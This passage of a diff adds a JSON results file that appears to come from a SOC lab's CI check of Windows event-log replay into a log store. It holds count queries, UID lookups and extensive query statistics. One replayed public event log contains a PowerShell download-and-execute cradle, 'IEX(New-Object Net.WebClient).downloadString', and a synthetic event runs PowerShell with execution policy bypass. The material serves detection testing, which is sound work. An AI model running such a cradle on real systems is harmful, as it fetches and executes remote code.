+                  "prePredicateDecompressedStructuredMetadataBytes": 0,
+                  "postPredicateRows": 0,
+                  "postPredicateDecompressedBytes": 0,
+                  "postPredicateStructuredMetadataBytes": 0,
+                  "postFilterRows": 0,
+                  "pagesScanned": 0,
+                  "pagesDownloaded": 0,
+                  "pagesDownloadedBytes": 0,
+                  "pageBatches": 0,
+                  "totalRowsAvailable": 0,
+                  "totalPageDownloadTime": 0
+                }
+              }
+            },
+            "cache": {
+              "chunk": {
+                "entriesFound": 1,
+                "entriesRequested": 1,
+                "entriesStored": 0,
+                "bytesReceived": 324503,
+                "bytesSent": 0,
+                "requests": 2,
+                "downloadTime": 0,
+                "queryLengthServed": 0
+              },
+              "index": {
+                "entriesFound": 0,
+                "entriesRequested": 0,
+                "entriesStored": 0,
+                "bytesReceived": 0,
+                "bytesSent": 0,
+                "requests": 0,
+                "downloadTime": 0,
+                "queryLengthServed": 0
+              },
+              "result": {
+                "entriesFound": 0,
+                "entriesRequested": 0,
+                "entriesStored": 0,
+                "bytesReceived": 0,
+                "bytesSent": 0,
+                "requests": 0,
+                "downloadTime": 0,
+                "queryLengthServed": 0
+              },
+              "statsResult": {
+                "entriesFound": 0,
+                "entriesRequested": 0,
+                "entriesStored": 0,
+                "bytesReceived": 0,
+                "bytesSent": 0,
+                "requests": 0,
+                "downloadTime": 0,
+                "queryLengthServed": 0
+              },
+              "volumeResult": {
+                "entriesFound": 0,
+                "entriesRequested": 0,
+                "entriesStored": 0,
+                "bytesReceived": 0,
+                "bytesSent": 0,
+                "requests": 0,
+                "downloadTime": 0,
+                "queryLengthServed": 0
+              },
+              "seriesResult": {
+                "entriesFound": 0,
+                "entriesRequested": 0,
+                "entriesStored": 0,
+                "bytesReceived": 0,
+                "bytesSent": 0,
+                "requests": 0,
+                "downloadTime": 0,
+                "queryLengthServed": 0
+              },
+              "labelResult": {
+                "entriesFound": 0,
+                "entriesRequested": 0,
+                "entriesStored": 0,
+                "bytesReceived": 0,
+                "bytesSent": 0,
+                "requests": 0,
+                "downloadTime": 0,
+                "queryLengthServed": 0
+              },
+              "instantMetricResult": {
+                "entriesFound": 0,
+                "entriesRequested": 0,
+                "entriesStored": 0,
+                "bytesReceived": 0,
+                "bytesSent": 0,
+                "requests": 0,
+                "downloadTime": 0,
+                "queryLengthServed": 0
+              }
+            },
+            "index": {
+              "totalChunks": 0,
+              "postFilterChunks": 0,
+              "shardsDuration": 0,
+              "usedBloomFilters": false,
+              "totalStreams": 0,
+              "chunkRefsLookupTime": 0,
+              "bloomFilterTime": 0
+            }
+          }
+        }
+      },
+      "expected_records": 3561,
+      "observed_records": 3561
+    },
+    {
+      "case_id": "case-003",
+      "kind": "Public EVTX",
+      "replay": {
+        "labels": {
+          "job": "soclab",
+          "case_id": "case-003",
+          "replay_run": "ci-backend",
+          "kind": "public",
+          "mode": "historical"
+        },
+        "sent_records": 3,
+        "start_ns": 1643055071361955000,
+        "end_ns": 1643055071361955000,
+        "delivery": "at-least-once HTTP batches; no exactly-once claim"
+      },
+      "count_query": "sum(count_over_time({job=\"soclab\",case_id=\"case-003\",replay_run=\"ci-backend\",mode=\"historical\"}[2s]))",
+      "count_response": {
+        "status": "success",
+        "data": {
+          "resultType": "vector",
+          "result": [
+            {
+              "metric": {},
+              "value": [
+                1643055071.361,
+                "3"
+              ]
+            }
+          ],
+          "stats": {
+            "summary": {
+              "bytesProcessedPerSecond": 42099,
+              "linesProcessedPerSecond": 40,
+              "totalBytesProcessed": 3139,
+              "totalLinesProcessed": 3,
+              "execTime": 0.0745611,
+              "queueTime": 0,
+              "subqueries": 0,
+              "totalEntriesReturned": 1,
+              "splits": 0,
+              "shards": 0,
+              "totalPostFilterLines": 3,
+              "totalStructuredMetadataBytesProcessed": 30
+            },
+            "querier": {
+              "store": {
+                "totalChunksRef": 1,
+                "totalChunksDownloaded": 1,
+                "chunksDownloadTime": 1476000,
+                "queryReferencedStructuredMetadata": false,
+                "queryUsedV2Engine": false,
+                "chunk": {
+                  "headChunkBytes": 0,
+                  "headChunkLines": 0,
+                  "decompressedBytes": 3139,
+                  "decompressedLines": 3,
+                  "compressedBytes": 1104,
+                  "totalDuplicates": 0,
+                  "postFilterLines": 3,
+                  "headChunkStructuredMetadataBytes": 0,
+                  "decompressedStructuredMetadataBytes": 30
+                },
+                "chunkRefsFetchTime": 70943400,
+                "congestionControlLatency": 0,
+                "pipelineWrapperFilteredLines": 0,
+                "dataobj": {
+                  "prePredicateDecompressedRows": 0,
+                  "prePredicateDecompressedBytes": 0,
+                  "prePredicateDecompressedStructuredMetadataBytes": 0,
+                  "postPredicateRows": 0,
+                  "postPredicateDecompressedBytes": 0,
+                  "postPredicateStructuredMetadataBytes": 0,
+                  "postFilterRows": 0,
+                  "pagesScanned": 0,
+                  "pagesDownloaded": 0,
+                  "pagesDownloadedBytes": 0,
+                  "pageBatches": 0,
+                  "totalRowsAvailable": 0,
+                  "totalPageDownloadTime": 0
+                }
+              },
+              "querierExecTime": 0.0730795
+            },
+            "ingester": {
+              "totalReached": 1,
+              "totalChunksMatched": 0,
+              "totalBatches": 1,
+              "totalLinesSent": 0,
+              "store": {
+                "totalChunksRef": 0,
+                "totalChunksDownloaded": 0,
+                "chunksDownloadTime": 0,
+                "queryReferencedStructuredMetadata": false,
+                "queryUsedV2Engine": false,
+                "chunk": {
+                  "headChunkBytes": 0,
+                  "headChunkLines": 0,
+                  "decompressedBytes": 0,
+                  "decompressedLines": 0,
+                  "compressedBytes": 0,
+                  "totalDuplicates": 0,
+                  "postFilterLines": 0,
+                  "headChunkStructuredMetadataBytes": 0,
+                  "decompressedStructuredMetadataBytes": 0
+                },
+                "chunkRefsFetchTime": 0,
+                "congestionControlLatency": 0,
+                "pipelineWrapperFilteredLines": 0,
+                "dataobj": {
+                  "prePredicateDecompressedRows": 0,
+                  "prePredicateDecompressedBytes": 0,
+                  "prePredicateDecompressedStructuredMetadataBytes": 0,
+                  "postPredicateRows": 0,
+                  "postPredicateDecompressedBytes": 0,
+                  "postPredicateStructuredMetadataBytes": 0,
+                  "postFilterRows": 0,
+                  "pagesScanned": 0,
+                  "pagesDownloaded": 0,
+                  "pagesDownloadedBytes": 0,
+                  "pageBatches": 0,
+                  "totalRowsAvailable": 0,
+                  "totalPageDownloadTime": 0
+                }
+              }
+            },
+            "cache": {
+              "chunk": {
+                "entriesFound": 1,
+                "entriesRequested": 1,
+                "entriesStored": 0,
+                "bytesReceived": 1491,
+                "bytesSent": 0,
+                "requests": 2,
+                "downloadTime": 0,
+                "queryLengthServed": 0
+              },
+              "index": {
+                "entriesFound": 0,
+                "entriesRequested": 0,
+                "entriesStored": 0,
+                "bytesReceived": 0,
+                "bytesSent": 0,
+                "requests": 0,
+                "downloadTime": 0,
+                "queryLengthServed": 0
+              },
+              "result": {
+                "entriesFound": 0,
+                "entriesRequested": 0,
+                "entriesStored": 0,
+                "bytesReceived": 0,
+                "bytesSent": 0,
+                "requests": 0,
+                "downloadTime": 0,
+                "queryLengthServed": 0
+              },
+              "statsResult": {
+                "entriesFound": 0,
+                "entriesRequested": 0,
+                "entriesStored": 0,
+                "bytesReceived": 0,
+                "bytesSent": 0,
+                "requests": 0,
+                "downloadTime": 0,
+                "queryLengthServed": 0
+              },
+              "volumeResult": {
+                "entriesFound": 0,
+                "entriesRequested": 0,
+                "entriesStored": 0,
+                "bytesReceived": 0,
+                "bytesSent": 0,
+                "requests": 0,
+                "downloadTime": 0,
+                "queryLengthServed": 0
+              },
+              "seriesResult": {
+                "entriesFound": 0,
+                "entriesRequested": 0,
+                "entriesStored": 0,
+                "bytesReceived": 0,
+                "bytesSent": 0,
+                "requests": 0,
+                "downloadTime": 0,
+                "queryLengthServed": 0
+              },
+              "labelResult": {
+                "entriesFound": 0,
+                "entriesRequested": 0,
+                "entriesStored": 0,
+                "bytesReceived": 0,
+                "bytesSent": 0,
+                "requests": 0,
+                "downloadTime": 0,
+                "queryLengthServed": 0
+              },
+              "instantMetricResult": {
+                "entriesFound": 0,
+                "entriesRequested": 0,
+                "entriesStored": 0,
+                "bytesReceived": 0,
+                "bytesSent": 0,
+                "requests": 0,
+                "downloadTime": 0,
+                "queryLengthServed": 0
+              }
+            },
+            "index": {
+              "totalChunks": 0,
+              "postFilterChunks": 0,
+              "shardsDuration": 0,
+              "usedBloomFilters": false,
+              "totalStreams": 0,
+              "chunkRefsLookupTime": 0,
+              "bloomFilterTime": 0
+            }
+          }
+        }
+      },
+      "uid_query": "{job=\"soclab\",case_id=\"case-003\",replay_run=\"ci-backend\",mode=\"historical\"} | json | event_uid = \"207cb97c427683bd4a6932c68a4ab823edf3327a0e495c082851f6b439194865\"",
+      "uid_response": {
+        "status": "success",
+        "data": {
+          "resultType": "streams",
+          "result": [
+            {
+              "stream": {
+                "case_id": "case-003",
+                "channel": "Microsoft-Windows-PowerShell/Operational",
+                "command_line": "",
+                "destination_ip": "",
+                "event_data_MessageNumber": "1",
+                "event_data_MessageTotal": "1",
+                "event_data_ScriptBlockId": "965150b4-b107-4cce-9d30-1d3c55a8a085",
+                "event_data_ScriptBlockText": "\"IEX(New-Object Net.WebClient).downloadString('https://miro.medium.com/max/1400/1*FnPDYeZVrGTbuE7Lj7JhgQ.png')\"",
+                "event_id": "4104",
+                "event_uid": "207cb97c427683bd4a6932c68a4ab823edf3327a0e495c082851f6b439194865",
+                "host": "fs03vuln.offsec.lan",
+                "image": "",
+                "ip": "",
+                "job": "soclab",
+                "kind": "public",
+                "logon_type": "",
+                "mode": "historical",
+                "original_timestamp": "2022-01-24T20:11:11.361955Z",
+                "parent_guid": "",
+                "process_guid": "",
+                "provider": "Microsoft-Windows-PowerShell",
+                "record_id": "83421",
+                "replay_mode": "historical",
+                "replay_run": "ci-backend",
+                "script_block": "\"IEX(New-Object Net.WebClient).downloadString('https://miro.medium.com/max/1400/1*FnPDYeZVrGTbuE7Lj7JhgQ.png')\"",
+                "service_name": "soclab",
+                "source_line": "1",
+                "source_sha256": "6600320605ea89b7a354be24e839d146b2a82d5783ae7ad67b207bedfec5b920",
+                "target_user": "",
+                "user": ""
+              },
+              "values": [
+                [
+                  "1643055071361955000",
+                  "{\"channel\":\"Microsoft-Windows-PowerShell/Operational\",\"command_line\":\"\",\"destination_ip\":\"\",\"event_data\":{\"MessageNumber\":\"1\",\"MessageTotal\":\"1\",\"ScriptBlockId\":\"965150b4-b107-4cce-9d30-1d3c55a8a085\",\"ScriptBlockText\":\"\\\"IEX(New-Object Net.WebClient).downloadString('https://miro.medium.com/max/1400/1*FnPDYeZVrGTbuE7Lj7JhgQ.png')\\\"\"},\"event_id\":4104,\"event_uid\":\"207cb97c427683bd4a6932c68a4ab823edf3327a0e495c082851f6b439194865\",\"host\":\"fs03vuln.offsec.lan\",\"image\":\"\",\"ip\":\"\",\"logon_type\":\"\",\"original_timestamp\":\"2022-01-24T20:11:11.361955Z\",\"parent_guid\":\"\",\"process_guid\":\"\",\"provider\":\"Microsoft-Windows-PowerShell\",\"record_id\":83421,\"replay_mode\":\"historical\",\"script_block\":\"\\\"IEX(New-Object Net.WebClient).downloadString('https://miro.medium.com/max/1400/1*FnPDYeZVrGTbuE7Lj7JhgQ.png')\\\"\",\"source_line\":1,\"source_sha256\":\"6600320605ea89b7a354be24e839d146b2a82d5783ae7ad67b207bedfec5b920\",\"target_user\":\"\",\"user\":\"\"}"
+                ]
+              ]
+            }
+          ],
+          "stats": {
+            "summary": {
+              "bytesProcessedPerSecond": 46148,
+              "linesProcessedPerSecond": 44,
+              "totalBytesProcessed": 3139,
+              "totalLinesProcessed": 3,
+              "execTime": 0.068019,
+              "queueTime": 0,
+              "subqueries": 0,
+              "totalEntriesReturned": 1,
+              "splits": 0,
+              "shards": 0,
+              "totalPostFilterLines": 1,
+              "totalStructuredMetadataBytesProcessed": 30
+            },
+            "querier": {
+              "store": {
+                "totalChunksRef": 1,
+                "totalChunksDownloaded": 1,
+                "chunksDownloadTime": 0,
+                "queryReferencedStructuredMetadata": false,
+                "queryUsedV2Engine": false,
+                "chunk": {
+                  "headChunkBytes": 0,
+                  "headChunkLines": 0,
+                  "decompressedBytes": 3139,
+                  "decompressedLines": 3,
+                  "compressedBytes": 1104,
+                  "totalDuplicates": 0,
+                  "postFilterLines": 1,
+                  "headChunkStructuredMetadataBytes": 0,
+                  "decompressedStructuredMetadataBytes": 30
+                },
+                "chunkRefsFetchTime": 66366200,
+                "congestionControlLatency": 0,
+                "pipelineWrapperFilteredLines": 0,
+                "dataobj": {
+                  "prePredicateDecompressedRows": 0,
+                  "prePredicateDecompressedBytes": 0,
+                  "prePredicateDecompressedStructuredMetadataBytes": 0,
+                  "postPredicateRows": 0,
+                  "postPredicateDecompressedBytes": 0,
+                  "postPredicateStructuredMetadataBytes": 0,
+                  "postFilterRows": 0,
+                  "pagesScanned": 0,
+                  "pagesDownloaded": 0,
+                  "pagesDownloadedBytes": 0,
+                  "pageBatches": 0,
+                  "totalRowsAvailable": 0,
+                  "totalPageDownloadTime": 0
+                }
+              },
+              "querierExecTime": 0.06754
+            },
+            "ingester": {
+              "totalReached": 1,
+              "totalChunksMatched": 0,
+              "totalBatches": 1,
+              "totalLinesSent": 0,
+              "store": {
+                "totalChunksRef": 0,
+                "totalChunksDownloaded": 0,
+                "chunksDownloadTime": 0,
+                "queryReferencedStructuredMetadata": false,
+                "queryUsedV2Engine": false,
+                "chunk": {
+                  "headChunkBytes": 0,
+                  "headChunkLines": 0,
+                  "decompressedBytes": 0,
+                  "decompressedLines": 0,
+                  "compressedBytes": 0,
+                  "totalDuplicates": 0,
+                  "postFilterLines": 0,
+                  "headChunkStructuredMetadataBytes": 0,
+                  "decompressedStructuredMetadataBytes": 0
+                },
+                "chunkRefsFetchTime": 0,
+                "congestionControlLatency": 0,
+                "pipelineWrapperFilteredLines": 0,
+                "dataobj": {
+                  "prePredicateDecompressedRows": 0,
+                  "prePredicateDecompressedBytes": 0,
+                  "prePredicateDecompressedStructuredMetadataBytes": 0,
+                  "postPredicateRows": 0,
+                  "postPredicateDecompressedBytes": 0,
+                  "postPredicateStructuredMetadataBytes": 0,
+                  "postFilterRows": 0,
+                  "pagesScanned": 0,
+                  "pagesDownloaded": 0,
+                  "pagesDownloadedBytes": 0,
+                  "pageBatches": 0,
+                  "totalRowsAvailable": 0,
+                  "totalPageDownloadTime": 0
+                }
+              }
+            },
+            "cache": {
+              "chunk": {
+                "entriesFound": 1,
+                "entriesRequested": 1,
+                "entriesStored": 0,
+                "bytesReceived": 1491,
+                "bytesSent": 0,
+                "requests": 2,
+                "downloadTime": 0,
+                "queryLengthServed": 0
+              },
+              "index": {
+                "entriesFound": 0,
+                "entriesRequested": 0,
+                "entriesStored": 0,
+                "bytesReceived": 0,
+                "bytesSent": 0,
+                "requests": 0,
+                "downloadTime": 0,
+                "queryLengthServed": 0
+              },
+              "result": {
+                "entriesFound": 0,
+                "entriesRequested": 0,
+                "entriesStored": 0,
+                "bytesReceived": 0,
+                "bytesSent": 0,
+                "requests": 0,
+                "downloadTime": 0,
+                "queryLengthServed": 0
+              },
+              "statsResult": {
+                "entriesFound": 0,
+                "entriesRequested": 0,
+                "entriesStored": 0,
+                "bytesReceived": 0,
+                "bytesSent": 0,
+                "requests": 0,
+                "downloadTime": 0,
+                "queryLengthServed": 0
+              },
+              "volumeResult": {
+                "entriesFound": 0,
+                "entriesRequested": 0,
+                "entriesStored": 0,
+                "bytesReceived": 0,
+                "bytesSent": 0,
+                "requests": 0,
+                "downloadTime": 0,
+                "queryLengthServed": 0
+              },
+              "seriesResult": {
+                "entriesFound": 0,
+                "entriesRequested": 0,
+                "entriesStored": 0,
+                "bytesReceived": 0,
+                "bytesSent": 0,
+                "requests": 0,
+                "downloadTime": 0,
+                "queryLengthServed": 0
+              },
+              "labelResult": {
+                "entriesFound": 0,
+                "entriesRequested": 0,
+                "entriesStored": 0,
+                "bytesReceived": 0,
+                "bytesSent": 0,
+                "requests": 0,
+                "downloadTime": 0,
+                "queryLengthServed": 0
+              },
+              "instantMetricResult": {
+                "entriesFound": 0,
+                "entriesRequested": 0,
+                "entriesStored": 0,
+                "bytesReceived": 0,
+                "bytesSent": 0,
+                "requests": 0,
+                "downloadTime": 0,
+                "queryLengthServed": 0
+              }
+            },
+            "index": {
+              "totalChunks": 0,
+              "postFilterChunks": 0,
+              "shardsDuration": 0,
+              "usedBloomFilters": false,
+              "totalStreams": 0,
+              "chunkRefsLookupTime": 0,
+              "bloomFilterTime": 0
+            }
+          }
+        }
+      },
+      "expected_records": 3,
+      "observed_records": 3
+    },
+    {
+      "case_id": "case-004",
+      "kind": "Synthetic experiment",
+      "replay": {
+        "labels": {
+          "job": "soclab",
+          "case_id": "case-004",
+          "replay_run": "ci-backend",
+          "kind": "synthetic",
+          "mode": "historical"
+        },
+        "sent_records": 4,
+        "start_ns": 1788339600000000000,
+        "end_ns": 1788339603000000000,
+        "delivery": "at-least-once HTTP batches; no exactly-once claim"
+      },
+      "count_query": "sum(count_over_time({job=\"soclab\",case_id=\"case-004\",replay_run=\"ci-backend\",mode=\"historical\"}[5s]))",
+      "count_response": {
+        "status": "success",
+        "data": {
+          "resultType": "vector",
+          "result": [
+            {
+              "metric": {},
+              "value": [
+                1788339603,
+                "4"
+              ]
+            }
+          ],
+          "stats": {
+            "summary": {
+              "bytesProcessedPerSecond": 375476,
+              "linesProcessedPerSecond": 348,
+              "totalBytesProcessed": 4311,
+              "totalLinesProcessed": 4,
+              "execTime": 0.0114814,
+              "queueTime": 0,
+              "subqueries": 0,
+              "totalEntriesReturned": 1,
+              "splits": 0,
+              "shards": 0,
+              "totalPostFilterLines": 4,
+              "totalStructuredMetadataBytesProcessed": 40
+            },
+            "querier": {
+              "store": {
+                "totalChunksRef": 1,
+                "totalChunksDownloaded": 1,
+                "chunksDownloadTime": 429500,
+                "queryReferencedStructuredMetadata": false,
+                "queryUsedV2Engine": false,
+                "chunk": {
+                  "headChunkBytes": 0,
+                  "headChunkLines": 0,
+                  "decompressedBytes": 4311,
+                  "decompressedLines": 4,
+                  "compressedBytes": 943,
+                  "totalDuplicates": 0,
+                  "postFilterLines": 4,
+                  "headChunkStructuredMetadataBytes": 0,
+                  "decompressedStructuredMetadataBytes": 40
+                },
+                "chunkRefsFetchTime": 1579500,
+                "congestionControlLatency": 0,
+                "pipelineWrapperFilteredLines": 0,
+                "dataobj": {
+                  "prePredicateDecompressedRows": 0,
+                  "prePredicateDecompressedBytes": 0,
+                  "prePredicateDecompressedStructuredMetadataBytes": 0,
+                  "postPredicateRows": 0,
+                  "postPredicateDecompressedBytes": 0,
+                  "postPredicateStructuredMetadataBytes": 0,
+                  "postFilterRows": 0,
+                  "pagesScanned": 0,
+                  "pagesDownloaded": 0,
+                  "pagesDownloadedBytes": 0,
+                  "pageBatches": 0,
+                  "totalRowsAvailable": 0,
+                  "totalPageDownloadTime": 0
+                }
+              },
+              "querierExecTime": 0.002009
+            },
+            "ingester": {
+              "totalReached": 1,
+              "totalChunksMatched": 0,
+              "totalBatches": 1,
+              "totalLinesSent": 0,
+              "store": {
+                "totalChunksRef": 0,
+                "totalChunksDownloaded": 0,
+                "chunksDownloadTime": 0,
+                "queryReferencedStructuredMetadata": false,
+                "queryUsedV2Engine": false,
+                "chunk": {
+                  "headChunkBytes": 0,
+                  "headChunkLines": 0,
+                  "decompressedBytes": 0,
+                  "decompressedLines": 0,
+                  "compressedBytes": 0,
+                  "totalDuplicates": 0,
+                  "postFilterLines": 0,
+                  "headChunkStructuredMetadataBytes": 0,
+                  "decompressedStructuredMetadataBytes": 0
+                },
+                "chunkRefsFetchTime": 0,
+                "congestionControlLatency": 0,
+                "pipelineWrapperFilteredLines": 0,
+                "dataobj": {
+                  "prePredicateDecompressedRows": 0,
+                  "prePredicateDecompressedBytes": 0,
+                  "prePredicateDecompressedStructuredMetadataBytes": 0,
+                  "postPredicateRows": 0,
+                  "postPredicateDecompressedBytes": 0,
+                  "postPredicateStructuredMetadataBytes": 0,
+                  "postFilterRows": 0,
+                  "pagesScanned": 0,
+                  "pagesDownloaded": 0,
+                  "pagesDownloadedBytes": 0,
+                  "pageBatches": 0,
+                  "totalRowsAvailable": 0,
+                  "totalPageDownloadTime": 0
+                }
+              }
+            },
+            "cache": {
+              "chunk": {
+                "entriesFound": 1,
+                "entriesRequested": 1,
+                "entriesStored": 0,
+                "bytesReceived": 1325,
+                "bytesSent": 0,
+                "requests": 2,
+                "downloadTime": 0,
+                "queryLengthServed": 0
+              },
+              "index": {
+                "entriesFound": 0,
+                "entriesRequested": 0,
+                "entriesStored": 0,
+                "bytesReceived": 0,
+                "bytesSent": 0,
+                "requests": 0,
+                "downloadTime": 0,
+                "queryLengthServed": 0
+              },
+              "result": {
+                "entriesFound": 0,
+                "entriesRequested": 0,
+                "entriesStored": 0,
+                "bytesReceived": 0,
+                "bytesSent": 0,
+                "requests": 0,
+                "downloadTime": 0,
+                "queryLengthServed": 0
+              },
+              "statsResult": {
+                "entriesFound": 0,
+                "entriesRequested": 0,
+                "entriesStored": 0,
+                "bytesReceived": 0,
+                "bytesSent": 0,
+                "requests": 0,
+                "downloadTime": 0,
+                "queryLengthServed": 0
+              },
+              "volumeResult": {
+                "entriesFound": 0,
+                "entriesRequested": 0,
+                "entriesStored": 0,
+                "bytesReceived": 0,
+                "bytesSent": 0,
+                "requests": 0,
+                "downloadTime": 0,
+                "queryLengthServed": 0
+              },
+              "seriesResult": {
+                "entriesFound": 0,
+                "entriesRequested": 0,
+                "entriesStored": 0,
+                "bytesReceived": 0,
+                "bytesSent": 0,
+                "requests": 0,
+                "downloadTime": 0,
+                "queryLengthServed": 0
+              },
+              "labelResult": {
+                "entriesFound": 0,
+                "entriesRequested": 0,
+                "entriesStored": 0,
+                "bytesReceived": 0,
+                "bytesSent": 0,
+                "requests": 0,
+                "downloadTime": 0,
+                "queryLengthServed": 0
+              },
+              "instantMetricResult": {
+                "entriesFound": 0,
+                "entriesRequested": 0,
+                "entriesStored": 0,
+                "bytesReceived": 0,
+                "bytesSent": 0,
+                "requests": 0,
+                "downloadTime": 0,
+                "queryLengthServed": 0
+              }
+            },
+            "index": {
+              "totalChunks": 0,
+              "postFilterChunks": 0,
+              "shardsDuration": 0,
+              "usedBloomFilters": false,
+              "totalStreams": 0,
+              "chunkRefsLookupTime": 0,
+              "bloomFilterTime": 0
+            }
+          }
+        }
+      },
+      "uid_query": "{job=\"soclab\",case_id=\"case-004\",replay_run=\"ci-backend\",mode=\"historical\"} | json | event_uid = \"3b87ca6306c3e0f832e3d43b89172961f75d8103d4ef8cb8488589faa82cdda9\"",
+      "uid_response": {
+        "status": "success",
+        "data": {
+          "resultType": "streams",
+          "result": [
+            {
+              "stream": {
+                "case_id": "case-004",
+                "channel": "Microsoft-Windows-Sysmon/Operational",
+                "command_line": "powershell.exe -ExecutionPolicy Bypass -File C:\\Lab\\backup.ps1",
+                "destination_ip": "",
+                "event_data_CommandLine": "powershell.exe -ExecutionPolicy Bypass -File C:\\Lab\\backup.ps1",
+                "event_data_Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+                "event_data_ParentImage": "C:\\Windows\\System32\\taskeng.exe",
+                "event_data_ParentProcessGuid": "{DEMO-PARENT}",
+                "event_data_ProcessGuid": "{TUNING-0}",
+                "event_data_User": "LAB\\backup.svc",
+                "event_id": "1",
+                "event_uid": "3b87ca6306c3e0f832e3d43b89172961f75d8103d4ef8cb8488589faa82cdda9",
+                "host": "WS-TUNING-LAB",
+                "image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+                "ip": "",
+                "job": "soclab",
+                "kind": "synthetic",
+                "logon_type": "",
+                "mode": "historical",
+                "original_timestamp": "2026-09-02T09:00:00.000000Z",
+                "parent_guid": "{DEMO-PARENT}",
+                "process_guid": "{TUNING-0}",
+                "provider": "Microsoft-Windows-Sysmon",
+                "record_id": "2000",
+                "replay_mode": "historical",
+                "replay_run": "ci-backend",
+                "script_block": "",
+                "service_name": "soclab",
+                "source_line": "1",
+                "source_sha256": "d907c25a6a0ab6a9ca78bae43fc633cdde7e3c470e1e985c607c5b213b8ed490",
+                "target_user": "",
+                "user": "LAB\\backup.svc"
+              },
+              "values": [
+                [
+                  "1788339600000000000",
+                  "{\"channel\":\"Microsoft-Windows-Sysmon/Operational\",\"command_line\":\"powershell.exe -ExecutionPolicy Bypass -File C:\\\\Lab\\\\backup.ps1\",\"destination_ip\":\"\",\"event_data\":{\"CommandLine\":\"powershell.exe -ExecutionPolicy Bypass -File C:\\\\Lab\\\\backup.ps1\",\"Image\":\"C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe\",\"ParentImage\":\"C:\\\\Windows\\\\System32\\\\taskeng.exe\",\"ParentProcessGuid\":\"{DEMO-PARENT}\",\"ProcessGuid\":\"{TUNING-0}\",\"User\":\"LAB\\\\backup.svc\"},\"event_id\":1,\"event_uid\":\"3b87ca6306c3e0f832e3d43b89172961f75d8103d4ef8cb8488589faa82cdda9\",\"host\":\"WS-TUNING-LAB\",\"image\":\"C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe\",\"ip\":\"\",\"logon_type\":\"\",\"original_timestamp\":\"2026-09-02T09:00:00.000000Z\",\"parent_guid\":\"{DEMO-PARENT}\",\"process_guid\":\"{TUNING-0}\",\"provider\":\"Microsoft-Windows-Sysmon\",\"record_id\":2000,\"replay_mode\":\"historical\",\"script_block\":\"\",\"source_line\":1,\"source_sha256\":\"d907c25a6a0ab6a9ca78bae43fc633cdde7e3c470e1e985c607c5b213b8ed490\",\"target_user\":\"\",\"user\":\"LAB\\\\backup.svc\"}"
+                ]
+              ]
+            }
+          ],
+          "stats": {
+            "summary": {
+              "bytesProcessedPerSecond": 1064786,
+              "linesProcessedPerSecond": 987,
+              "totalBytesProcessed": 4311,
+              "totalLinesProcessed": 4,
+              "execTime": 0.004049,
+              "queueTime": 0,
+              "subqueries": 0,
+              "totalEntriesReturned": 1,
+              "splits": 0,
+              "shards": 0,
+              "totalPostFilterLines": 1,
+              "totalStructuredMetadataBytesProcessed": 40
+            },
+            "querier": {
+              "store": {
+                "totalChunksRef": 1,
+                "totalChunksDownloaded": 1,
+                "chunksDownloadTime": 0,
+                "queryReferencedStructuredMetadata": false,
+                "queryUsedV2Engine": false,
+                "chunk": {
+                  "headChunkBytes": 0,
+                  "headChunkLines": 0,
+                  "decompressedBytes": 4311,
+                  "decompressedLines": 4,
+                  "compressedBytes": 943,
+                  "totalDuplicates": 0,
+                  "postFilterLines": 1,
+                  "headChunkStructuredMetadataBytes": 0,
+                  "decompressedStructuredMetadataBytes": 40
+                },
+                "chunkRefsFetchTime": 1824200,
+                "congestionControlLatency": 0,
+                "pipelineWrapperFilteredLines": 0,
+                "dataobj": {
+                  "prePredicateDecompressedRows": 0,
+                  "prePredicateDecompressedBytes": 0,
+                  "prePredicateDecompressedStructuredMetadataBytes": 0,
+                  "postPredicateRows": 0,
+                  "postPredicateDecompressedBytes": 0,
+                  "postPredicateStructuredMetadataBytes": 0,
+                  "postFilterRows": 0,
+                  "pagesScanned": 0,
+                  "pagesDownloaded": 0,
+                  "pagesDownloadedBytes": 0,
+                  "pageBatches": 0,
+                  "totalRowsAvailable": 0,
+                  "totalPageDownloadTime": 0
+                }
+              },
+              "querierExecTime": 0.002398
+            },
+            "ingester": {
+              "totalReached": 1,
+              "totalChunksMatched": 0,
+              "totalBatches": 1,
+              "totalLinesSent": 0,
+              "store": {
+                "totalChunksRef": 0,
+                "totalChunksDownloaded": 0,
+                "chunksDownloadTime": 0,
+                "queryReferencedStructuredMetadata": false,
+                "queryUsedV2Engine": false,
+                "chunk": {
+                  "headChunkBytes": 0,
+                  "headChunkLines": 0,
+                  "decompressedBytes": 0,
+                  "decompressedLines": 0,
+                  "compressedBytes": 0,
+                  "totalDuplicates": 0,
+                  "postFilterLines": 0,
+                  "headChunkStructuredMetadataBytes": 0,
+                  "decompressedStructuredMetadataBytes": 0
+                },
+                "chunkRefsFetchTime": 0,
+                "congestionControlLatency": 0,
+                "pipelineWrapperFilteredLines": 0,
+                "dataobj": {
+                  "prePredicateDecompressedRows": 0,
+                  "prePredicateDecompressedBytes": 0,
+                  "prePredicateDecompressedStructuredMetadataBytes": 0,
+                  "postPredicateRows": 0,
+                  "postPredicateDecompressedBytes": 0,
+                  "postPredicateStructuredMetadataBytes": 0,
+                  "postFilterRows": 0,
+                  "pagesScanned": 0,
+                  "pagesDownloaded": 0,
+                  "pagesDownloadedBytes": 0,
+                  "pageBatches": 0,
+                  "totalRowsAvailable": 0,
+                  "totalPageDownloadTime": 0
+                }
+              }
+            },
+            "cache": {
+              "chunk": {
+                "entriesFound": 1,
+                "entriesRequested": 1,
+                "entriesStored": 0,
+                "bytesReceived": 1325,
+                "bytesSent": 0,
+                "requests": 2,
+                "downloadTime": 0,
+                "queryLengthServed": 0
+              },
+              "index": {
+                "entriesFound": 0,
+                "entriesRequested": 0,
+                "entriesStored": 0,
+                "bytesReceived": 0,
+                "bytesSent": 0,
+                "requests": 0,
+                "downloadTime": 0,
+                "queryLengthServed": 0
+              },
+              "result": {
+                "entriesFound": 0,
+                "entriesRequested": 0,
+                "entriesStored": 0,
+                "bytesReceived": 0,
+                "bytesSent": 0,
+                "requests": 0,
+                "downloadTime": 0,
+                "queryLengthServed": 0
+              },
+              "statsResult": {
+                "entriesFound": 0,
+                "entriesRequested": 0,
+                "entriesStored": 0,
+                "bytesReceived": 0,
+                "bytesSent": 0,
+                "requests": 0,
+                "downloadTime": 0,
+                "queryLengthServed": 0
+              },
+              "volumeResult": {
+                "entriesFound": 0,
